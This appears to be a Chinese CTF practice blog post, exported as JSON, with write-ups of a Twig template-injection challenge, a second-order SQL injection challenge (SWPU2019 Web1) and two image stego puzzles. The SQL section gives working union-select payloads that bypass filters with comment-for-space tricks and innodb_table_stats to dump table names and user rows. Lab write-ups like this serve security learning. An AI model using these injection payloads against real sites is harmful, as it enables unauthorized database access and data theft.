{"title":"BUU刷题20201207-20201214","uid":"534e07e0322b2e8867b8c55d490051f3","slug":"BUU刷题20201207-20201214","date":"2020-12-08T10:57:03.000Z","updated":"2021-06-28T14:57:41.651Z","comments":true,"path":"api/articles/BUU刷题20201207-20201214.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","content":"<h2 id=\"BJDCTF2020-Cookie-is-so-stable\"><a href=\"#BJDCTF2020-Cookie-is-so-stable\" class=\"headerlink\" title=\"[BJDCTF2020]Cookie is so stable\"></a>[BJDCTF2020]Cookie is so stable</h2><p>考点：twig模板注入</p>\n<p>hint.php文件里提示看看cookies,再cookie里的user处发现了一个ssti点，这里是PHP环境，所以就是PHP的ssti。这里通过测试是twig模板注入</p>\n<p>payload:</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20201217124951.png\" alt=\"1\"></p>\n<p>得到flag</p>\n<p>twig是一款使用与PHP的现代模板引擎，官网<a href=\"https://twig.symfony.com/%EF%BC%8C%E6%A0%B9%E6%8D%AE%E5%AE%98%E7%BD%91%E7%9A%84%E4%BB%8B%E7%BB%8D%EF%BC%8CTwig%E6%9C%89%E6%AF%94%E8%BE%83%E7%AE%80%E6%B4%81%E7%9A%84%E8%AF%AD%E6%B3%95%E3%80%82%E5%85%B7%E6%9C%89%E9%9D%A2%E5%90%91%E6%A8%A1%E6%9D%BF%E7%9A%84%E8%AF%AD%E6%B3%95%EF%BC%9A\">https://twig.symfony.com/，根据官网的介绍，Twig有比较简洁的语法。具有面向模板的语法：</a></p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20201217125002.png\"></p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20201217125015.png\"></p>\n<h2 id=\"SWPU2019-Web1\"><a href=\"#SWPU2019-Web1\" class=\"headerlink\" title=\"[SWPU2019]Web1\"></a>[SWPU2019]Web1</h2><p>考点：二次注入</p>\n<p>这题再广告发布页面存在二次注入漏洞，这个我一开始没有发现，值得注意，在类似留言版的位置也是可能存在一个二次注入点的可能的。空格和information_schema被过滤了，order by也用不了。</p>\n<p>首先使用union select来做列数的确定，一个一个试，发现有22列。然后读取处数据库名为web1</p>\n<p>获取表名：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里可以使用innodb_table_stats来代替information_schema，然后得到查询结果</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">FLAG_TABLE,news,users,gtid_slave_pos,ads,users<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>关注users，因为知道管理员账户admin是存在的，所以看看users</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;as&#x2F;**&#x2F;a,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)x),database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>得到了查询结果：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">2,flag,admin,123<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这是第二列的结果，下面看看表的第三列是什么</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;as&#x2F;**&#x2F;a,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)x),database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>得到flag</p>\n<h2 id=\"Misc-大白\"><a href=\"#Misc-大白\" class=\"headerlink\" title=\"[Misc]大白\"></a>[Misc]大白</h2><p>修改图片长宽，获取flag。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210124205552110.png\" alt=\"image-20210124205552110\"></p>\n<h2 id=\"Misc-你竟然赶我走\"><a href=\"#Misc-你竟然赶我走\" class=\"headerlink\" title=\"[Misc]你竟然赶我走\"></a>[Misc]你竟然赶我走</h2><p>winhex查看末尾：flag{stego_is_s0_bor1ing}</p>\n","text":"[BJDCTF2020]Cookie is so stable考点：twig模板注入 hint.php文件里提示看看cookies,再cookie里的user处发现了一个ssti点，这里是PHP环境，所以就是PHP的ssti。这里通过测试是twig模板注入 payload: 得到...","link":"","photos":[],"count_time":{"symbolsCount":"1.6k","symbolsTime":"1 mins."},"categories":[{"name":"CTF","slug":"CTF","count":41,"path":"api/categories/CTF.json"}],"tags":[{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"},{"name":"BJDCTF","slug":"BJDCTF","count":1,"path":"api/tags/BJDCTF.json"},{"name":"SWPU2019","slug":"SWPU2019","count":1,"path":"api/tags/SWPU2019.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#BJDCTF2020-Cookie-is-so-stable\"><span class=\"toc-text\">[BJDCTF2020]Cookie is so stable</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SWPU2019-Web1\"><span class=\"toc-text\">[SWPU2019]Web1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Misc-%E5%A4%A7%E7%99%BD\"><span class=\"toc-text\">[Misc]大白</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Misc-%E4%BD%A0%E7%AB%9F%E7%84%B6%E8%B5%B6%E6%88%91%E8%B5%B0\"><span class=\"toc-text\">[Misc]你竟然赶我走</span></a></li></ol>","author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"BUUOJ刷题记录2020-12-14-21","uid":"c9ff35e68b84eedc69746ce24f3be94d","slug":"BUUOJ刷题记录2020-12-14-21","date":"2020-12-14T08:21:58.000Z","updated":"2021-06-28T14:58:24.289Z","comments":true,"path":"api/articles/BUUOJ刷题记录2020-12-14-21.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","text":"[WesternCTF2018]shrine考点 ：代码审计、ssti import flask import os app = flask.Flask(__name__) app.config['FLAG'] = os.environ.pop('FLAG') @ app.rou...","link":"","photos":[],"count_time":{"symbolsCount":"3.5k","symbolsTime":"3 mins."},"categories":[{"name":"CTF","slug":"CTF","count":41,"path":"api/categories/CTF.json"}],"tags":[{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"SWPUCTF杂项","uid":"8a47ad09cc35b02d6729e585b457dd31","slug":"SWPUCTF杂项","date":"2020-12-06T05:19:56.000Z","updated":"2020-12-17T05:21:48.000Z","comments":true,"path":"api/articles/SWPUCTF杂项.json","keywords":"A1andNS","cover":[],"text":"考前的死亡浪，摸了一题就溜去复习了。 耗子为汁下载gif文件，先做gif分帧，发现没有东西。所以使用binwalk分析文件，发现有隐藏文件，所以binwalk分离，这里foremost有问题，得不到后面关键的视频文件。 binwalk后会有一个flag.txt可惜是假flag，然...","link":"","photos":[],"count_time":{"symbolsCount":979,"symbolsTime":"1 mins."},"categories":[{"name":"CTF","slug":"CTF","count":41,"path":"api/categories/CTF.json"}],"tags":[{"name":"SWPUCTF2020","slug":"SWPUCTF2020","count":1,"path":"api/tags/SWPUCTF2020.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}